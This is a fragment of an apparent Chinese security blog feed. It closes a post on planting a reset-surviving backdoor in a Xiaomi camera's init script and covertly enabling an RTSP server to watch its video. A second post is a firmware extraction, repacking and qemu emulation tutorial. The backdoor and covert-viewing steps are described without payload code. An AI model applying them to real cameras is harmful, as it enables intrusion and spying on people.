title="后记"></a>后记</h2><p>这个系统竟然可改写，我之前遇见过的摄像头都是不可改写系统。</p><p><img alt="image-20200807193009019" data-src="https://nocbtm.github.io/imgs/image-20200807193009019.png" class="lozad"></p><p>修改一下初始化脚本，植入后门。这里要修改最初始的脚本，如果修改 <code>usr/imi/start.sh</code>重启后会复原</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/<span class="built_in">local</span>/bin/run.sh</span><br></pre></td></tr></table></figure><p><img alt="image-20200807200653949" data-src="https://nocbtm.github.io/imgs/image-20200807200653949.png" class="lozad"></p><p>重启一下，连接成功。经检测重置之后后门依然有效</p><p><img alt="image-20200807200400625" data-src="E:\hexo\myhexo\source\imgs\image-20200807200400625.png" class="lozad"></p><p>而且发现了rtsp_server，再把这个服务悄悄放到初始化脚本里，这样不就随便看监控视频了吗</p><p><img alt="image-20200807202247047" data-src="https://nocbtm.github.io/imgs/image-20200807202247047.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;大致分析&quot;&gt;&lt;a href=&quot;#大致分析&quot; class=&quot;headerlink&quot; title=&quot;大致分析&quot;&gt;&lt;/a&gt;大致分析&lt;/h2&gt;&lt;p&gt;拿到摄像头第一步，拆机，看看有没有uart调试口，找一下flash芯片&lt;/p&gt;
&lt;p&gt;小米做的是真的好，不太好拆，可参考硬核
      
    
    </summary>
    
      <category term="iot" scheme="https://nocbtm.github.io/categories/iot/"/>
    
    
      <category term="iot" scheme="https://nocbtm.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>iot固件的一些操作</title>
    <link href="https://nocbtm.github.io/2020/07/06/iot%E5%85%A5%E9%97%A8-%E5%9B%BA%E4%BB%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%93%8D%E4%BD%9C/"/>
    <id>https://nocbtm.github.io/2020/07/06/iot入门-固件的一些操作/</id>
    <published>2020-07-06T09:46:47.000Z</published>
    <updated>2020-09-01T10:41:22.140Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然通过官网下载固件的方法比较便捷，但是有些厂商并不会提供固件的下载链接，这就需要我们通过其他途径来获取固件。使用从硬件设备提取固件的方法会比较通用（前提是需要有实体机设备），因为固件一般都会存储在 PCB 的某个位置里。将设备拆开之后，找到相应的 flash rom 或者 Nor flash，使用专门的工具（烧写器、编程器）进行固件的提取。</p><p>先认识一下flash文件系统和固件类型</p><h2 id="flash文件系统"><a href="#flash文件系统" class="headerlink" title="flash文件系统"></a>flash文件系统</h2><p>与普通计算机系统不同的是，嵌入式系统往往需要使用低成本的存储器，诸如EEPROM（带电可擦可编程只读存储器）或Nor/Nand Flash等。Nand flash存储器经常可以与NOR Flash存储器互换使用。大多数情况下闪存只是用来存储少量的代码，这时NOR闪存更适合一些，而NAND则是高数据存储密度的理想解决方案。</p><p>Reference:<a href="https://www.cnblogs.com/iriczhao/p/12128451.html" target="_blank" rel="noopener">Nand Flash 和Nor Flash的区别详解</a></p><p>这里列举一些最常见的Flash文件系统，具体如下：</p><h3 id="Squashfs"><a href="#Squashfs" class="headerlink" title="Squashfs"></a>Squashfs</h3><p>SquashFS 是一套基于Linux内核使用的压缩只读文件系统，文件最大支持2^64字节。他是基于GPL协议的开源软件。初始的版本使用gzip压缩，2.6.34版本Linux内核增加了支持LZMA和LZO压缩，并且在2.6.3内核版本上增加支持XZ压缩。OpenWrt以及DD-Wrt的固件使用的就是这种文件系统,多见于4～16MB的Nor型Flash中。</p><h3 id="JFFS-JFFS2"><a href="#JFFS-JFFS2" class="headerlink" title="JFFS/JFFS2"></a>JFFS/JFFS2</h3><p>全名是Journalling Flash File System，是RedHat公司开发的闪存文件系统，最早是为NOR Flash设计的，自2.6版本<br>以后开始支持NAND Flash，极适合用于嵌入式系统，多见于32MB以下的Nor型Flash固件中。它支持三种压缩算法：zlib、rubin以及rtime。</p><h3 id="YAFFS-YAFFS2"><a href="#YAFFS-YAFFS2" class="headerlink" title="YAFFS/YAFFS2"></a>YAFFS/YAFFS2</h3><p>全称为Yet Another Flash File System，是由Aleph One公司发展出来的NAND flash嵌入式文件系统。与JFFS不同的<br>是，YAFFS最初是专门针对Nand型Flash所设计的，对于大容量的Flash读写更有优势，而JFFS在小容量的FLASH中更具优势，两者各有侧重。这种文件系统多见于128MB以上的Nand型Flash固件中。</p><h2 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h2><p><img alt="image-20200724150957627" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724150957627.png" class="lozad"></p><p><img alt="image-20200724151101485" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200724151101485.png" class="lozad"></p><h2 id="固件类型"><a href="#固件类型" class="headerlink" title="固件类型"></a>固件类型</h2><p>固件就是程序+文件系统的组合，由文件系统将多个程序组合成一个更大、更复杂的二进制文件。当然这里的大小指的是一个相对的概念。很多时候，固件的大小往往只有几MB，而在Windows或Linux上的可执行文件动辄就是几百MB，当然两者是不能比的，相比而言，固件是麻雀虽小，五脏俱全。</p><p>常见的固件类型，大概可分为如下几种：</p><h3 id="裸机程序"><a href="#裸机程序" class="headerlink" title="裸机程序"></a>裸机程序</h3><p>它是组成最简单的固件，也是最容易分析的固件，IDA可以正确识别并分析这种类型的固件。这类的设备可以看作是 “单片机设备”，设备固件中是比较简单的控制、循环逻辑，利用中断、例程来处理外部世界的各种事件，如常见的智能门锁内部固件</p><h3 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h3><p>面向控制，通信领域的实时操作系统（RTOS），如windriver公司的VxWorks、isi的psos、qnx系统软件公司的qnx、ati的nucieus等</p><p>Vxworks镜像分类</p><ul><li>可加载行VxWorks镜像：存储在开发机上，运行在板上RAM中</li><li>基于ROM的VXWorks镜像：存储在板上ROM，运行在板上RAM中</li><li>ROM驻留的VXWorks镜像：存储 在板上ROM，运行在板上ROM中</li></ul><h3 id="非实时操作系统"><a href="#非实时操作系统" class="headerlink" title="非实时操作系统"></a>非实时操作系统</h3><p>面向消费电子产品的非实时操作系统，包括个人数字助理（pad）、移动电话、机顶盒、电子书、webpone等。系统有Microsoft的WinCE，3Com的Palm，以及Symbian和Google的Andrioid等</p><h2 id="固件解包"><a href="#固件解包" class="headerlink" title="固件解包"></a>固件解包</h2><p>binwak 是一款优秀的固件分析、固件解包工具。可以用来解析绝大多数没有加密的固件，进行解包从而获取到固件的文件系统。</p><p>针对不同的flash文件系统也有不同的工具来解包，比如</p><p>1、Firmware Mod Kit广泛应用于Squashfs类型的固件编辑，支持多款路由器，OpenWrt和DD-Wrt的所有固件，以及TP-Link、ASUS、D-Link的大部分路由型号的固件。</p><p>2、mtd-utils 由于jffs/jffs2和yaffs/yaffs2是基于MTD的文件系统，因此可以使用Linux下的mtd-utils中的内核工具来获得对这两种文件系统的支持</p><h3 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h3><p>binwalk通过识别文件头 智能扫描目标文件所有可识别的文件类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk DIR818LW_FW205b03.bin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ file DIR818LW_FW205b03.bin </span><br><span class="line">DIR818LW_FW205b03.bin: data</span><br><span class="line">$ binwalk DIR818LW_FW205b03.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/6"</span></span><br><span class="line">120           0x78            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5451004 bytes</span><br><span class="line">1704056       0x1A0078        PackImg section delimiter tag, little endian size: 8415232 bytes; big endian size: 6848512 bytes</span><br><span class="line">1704088       0x1A0098        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6848463 bytes, 2622 inodes, blocksize: 131072 bytes, created: 2015-07-09 07:38:10</span><br></pre></td></tr></table></figure><p>提取文件</p><p>“-e” 按照预定义的配置文件中的提取方法提取文件</p><p>“-M” 用于根据magic签名扫描结果进行递归提取</p><p>“-d” 用于限制递归提取深度，默认为8</p><p>“-A “ 使用普通可执行操作码签名扫描目标文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me  DIR818LW_FW205b03.bin</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me DIR818LW_FW205b03.bin </span><br><span class="line"></span><br><span class="line">Scan Time:     2020-07-07 04:04:01</span><br><span class="line">Target File:   /home/iot/Desktop/tools/firmadyne/firmware/DIR818LW_FW205b03.bin</span><br><span class="line">MD5 Checksum:  be061ea71c8714b7c850e0a24291f269</span><br><span class="line">Signatures:    404</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/6"</span></span><br><span class="line">120           0x78            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5451004 bytes</span><br><span class="line">1704056       0x1A0078        PackImg section delimiter tag, little endian size: 8415232 bytes; big endian size: 6848512 bytes</span><br><span class="line">1704088       0x1A0098        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6848463 bytes, 2622 inodes, blocksize: 131072 bytes, created: 2015-07-09 07:38:10</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scan Time:     2020-07-07 04:04:08</span><br><span class="line">Target File:   /home/iot/Desktop/tools/firmadyne/firmware/_DIR818LW_FW205b03.bin-0.extracted/78</span><br><span class="line">MD5 Checksum:  55be7263933b41415e8c7c0fb46e614a</span><br><span class="line">Signatures:    404</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1090373       0x10A345        Cisco IOS microcode, <span class="keyword">for</span> <span class="string">"&amp;0"</span></span><br><span class="line">2934348       0x2CC64C        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">4116512       0x3ED020        Linux kernel version 2.6.30</span><br><span class="line">4153552       0x3F60D0        CRC32 polynomial table, little endian</span><br><span class="line">4653968       0x470390        Neighborly text, <span class="string">"NeighborSolicitstunnel6 init(): can't add protocol"</span></span><br><span class="line">4653988       0x4703A4        Neighborly text, <span class="string">"NeighborAdvertisementst add protocol"</span></span><br><span class="line">4658095       0x4713AF        Neighborly text, <span class="string">"neighbor %.2x%.2x.%.2x:%.2x:%.2x:%.2x:%.2x:%.2x lost on port %d(%s)(%s)"</span></span><br><span class="line">4673787       0x4750FB        HTML document header</span><br><span class="line">4673950       0x47519E        HTML document footer</span><br></pre></td></tr></table></figure><p>提取出的文件如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> _DIR818LW_FW205b03.bin.extracted/</span><br><span class="line">$ ls</span><br><span class="line">1A0098.squashfs  78  78.7z  squashfs-root</span><br><span class="line">$ <span class="built_in">cd</span> squashfs-root/</span><br><span class="line">$ ls</span><br><span class="line">bin  dev  etc  home  htdocs  include  lib  mnt  mydlink  proc  sbin  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure><h2 id="加密固件解包"><a href="#加密固件解包" class="headerlink" title="加密固件解包"></a>加密固件解包</h2><h3 id="vxwork"><a href="#vxwork" class="headerlink" title="vxwork"></a>vxwork</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ dd <span class="keyword">if</span>=wdr5620v3.bin of=400.lzma bs=1 skip=1024 count=861326</span><br><span class="line">861326+0 records <span class="keyword">in</span></span><br><span class="line">861326+0 records out</span><br><span class="line">861326 bytes (861 kB, 841 KiB) copied, 1.57047 s, 548 kB/s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>=文件名：输入文件名</span><br><span class="line">of=文件名：输出文件名</span><br><span class="line">skip=blocks：从输入文件开头跳过blocks个块后再开始复制</span><br><span class="line">bs=bytes：同时设置读入/输出的块大小为bytes个字节</span><br><span class="line">count= 读取的字节大小</span><br></pre></td></tr></table></figure><p>解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ lzma -d 400.lzma</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -s 0xc1100 -n 512 -C bin</span><br></pre></td></tr></table></figure><p>提取符号表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"> </span><br><span class="line">symfile_path = <span class="string">'./C2E3A'</span> <span class="comment">#程序名</span></span><br><span class="line">symbols_table_start = <span class="number">8</span></span><br><span class="line">strings_table_start = <span class="number">0x9d00</span> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> open(symfile_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    symfile_contents = f.read()</span><br><span class="line"> </span><br><span class="line">symbols_table = symfile_contents[symbols_table_start:strings_table_start]</span><br><span class="line">strings_table = symfile_contents[strings_table_start:]</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_string_by_offset</span><span class="params">(offset)</span>:</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">if</span> strings_table[offset+index] != <span class="string">'x00'</span>:</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> strings_table[offset:offset+index]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_symbols_metadata</span><span class="params">()</span>:</span></span><br><span class="line">    symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> xrange(<span class="number">0</span>, len(symbols_table),<span class="number">8</span>):</span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        string_offset = int(symbol_item[<span class="number">1</span>:<span class="number">4</span>].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        string_name = get_string_by_offset(string_offset)</span><br><span class="line">        target_address = int(symbol_item[<span class="number">-4</span>:].encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span><span class="params">(symbols_meta_data)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        idc.MakeName(target_address, string_name)</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">'x54'</span>:</span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure><h2 id="固件封装"><a href="#固件封装" class="headerlink" title="固件封装"></a>固件封装</h2><p>firmware-mod-kit 工具包可用于提取固件中的文档系统，然后对其进行修改，并重新打包成固件。我们可以使用它对固件做定制化的修改，但是也有可能被恶意地用于在固件中添加后门等，所以在下载固件时应到官方网站下载，并检查固件是否被修改过。</p><p>该工具包支持以下固件：</p><blockquote><p>DD-WRT v23 tested - versions v23 SP1 and later are compatible (soon older versions too).<br>DD-WRT v24 tested<br>OpenWrt White Russian tested<br>OpenWrt Kamikaze untested (should work) - not really necessary, based on OpenWrt has its Image Builder.<br>FreeWrt untested - should work ok<br>HyperWrt untested<br>Ewrt untested<br>Sveasoft Alchemy untested<br>Sveasoft Talisman untested<br>Linksys / other vendor not supported by scripts yet - haven’t added cramfs handling<br>ASUS WL-330G untested - should work ok<br>ASUS WL-520G untested - should work ok<br>ASUS WL-530G supported<br>ASUS WL-550G untested - should work ok<br>Trendnet TEW-632BRP tested<br>DLink DIR-615 untested<br>many others* untested</p></blockquote><p>可在 <a href="https://code.google.com/archive/p/firmware-mod-kit/" target="_blank" rel="noopener">google code</a> 下载 Firmware Mod Kit v0.99 安装包，然后解压安装，安装前需要先安装相应的依赖库。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git build-essential zlib1g-dev liblzma-dev python-magic</span><br><span class="line"></span><br><span class="line"><span class="variable">$cd</span> firmware-mod-kit/src</span><br><span class="line">$./configure &amp;&amp; make</span><br></pre></td></tr></table></figure><p>firmware-mod-kit 中包含以下几个工具脚本：</p><blockquote><p>extract-firmware.sh：解包固件<br>build-firmware.sh：重新打包固件<br>check_for_upgrade.sh：检查更新<br>unsquashfs_all.sh：解包提取出来的 squashfs 文档</p></blockquote><h2 id="固件对比"><a href="#固件对比" class="headerlink" title="固件对比"></a>固件对比</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bmaia/binwall</span><br><span class="line"></span><br><span class="line">python binwally.py dir1 dir2</span><br></pre></td></tr></table></figure><h2 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h2><p>因为例如 MIPS、ARM 指令集是无法直接在 X86 的指令集机器上直接运行的，所以就需要使用一个模拟环境，可以用 qemu或者Firmadyne来模拟</p><h3 id="qemu"><a href="#qemu" class="headerlink" title="qemu"></a>qemu</h3><p>qemu有系统模式和用户模式。对于只想模拟单个程序的话使用用户模拟即可；对于整个设备（摄像头、路由器等）的环境来说，使用系统模式比较方便</p><h4 id="用户模式"><a href="#用户模式" class="headerlink" title="用户模式"></a>用户模式</h4><p>以 dir645_FW_103.bin 为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ wget ftp://ftp2.dlink.com/PRODUCTS/DIR-645/REVA/DIR-645_FIRMWARE_1.03.ZIP</span><br><span class="line">$ binwalk dir645_FW_103.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             DLOB firmware header, boot partition: <span class="string">"dev=/dev/mtdblock/2"</span></span><br><span class="line">112           0x70            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 4237576 bytes</span><br><span class="line">1441904       0x160070        PackImg section delimiter tag, little endian size: 3169792 bytes; big endian size: 6172672 bytes</span><br><span class="line">1441936       0x160090        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 6170670 bytes, 2216 inodes, blocksize: 262144 bytes, created: 2012-10-09 10:24:09</span><br><span class="line"></span><br><span class="line">$ binwalk -Me dir645_FW_103.bin </span><br><span class="line">$ ls</span><br><span class="line">dir645_FW_103.bin*  _dir645_FW_103.bin.extracted/</span><br><span class="line">$ file _dir645_FW_103.bin.extracted/squashfs-root/bin/busybox </span><br><span class="line">_dir645_FW_103.bin.extracted/squashfs-root/bin/busybox: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), statically linked, stripped</span><br></pre></td></tr></table></figure><p>查看<code>squashfs-root/bin/busybox</code>为mips32 静态链接程序,所以用<code>qemu-mips-static</code>来模拟，启动单个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp /usr/bin/qemu-mips-static .</span><br><span class="line">$ sudo chroot . ./qemu-mips-static ./sbin/httpd</span><br></pre></td></tr></table></figure><h4 id="系统模式"><a href="#系统模式" class="headerlink" title="系统模式"></a>系统模式</h4><p>下载不同架构的kernel和文件系统，用来系统模拟。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r -np -nH -R index.html https://people.debian.org/~aurel32/qemu/</span><br></pre></td></tr></table></figure><p><img alt="image-20200707180834331" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200707180834331.png" class="lozad"></p><p>以mips为例</p><p><img alt="image-20200707181153719" data-src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20200707181153719.png" class="lozad"></p><p>先在物理机添加个虚拟网卡tap0并配置ip，以便和虚拟机进行通信</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">$ sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">Set <span class="string">'tap0'</span> persistent and owned by uid 1000</span><br><span class="line">$ ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1273210  bytes 1632037231 (1.6 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 262339  bytes 15789435 (15.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 564  bytes 42862 (42.8 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 564  bytes 42862 (42.8 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">$ sudo ifconfig tap0 192.168.164.139/24</span><br><span class="line">$ ifconfig </span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.137  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::f47c:851e:6b2a:ca13  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:44:85:45  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 1272982  bytes 1632018319 (1.6 GB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 262111  bytes 15770766 (15.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 544  bytes 41616 (41.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 544  bytes 41616 (41.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">tap0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.164.139  netmask 255.255.255.0  broadcast 192.168.164.255</span><br><span class="line">        inet6 fe80::2054:a3ff:fead:808f  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 22:54:a3:ad:80:8f  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 17  bytes 3330 (3.3 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 5  bytes 430 (430.0 B)</span><br><span class="line">        TX errors 0  dropped 3 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>需要注意的是配置的tap0的ip要和本地ip在同一个网段，如果配置错误，可以<code>sudo tunctl -d tap0</code>删除重新配置</p><p>然后启动虚拟机，虚拟机默认用户密码为root/root，登录后我们需要配置虚拟机ip地址与tap0也在同一网段</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 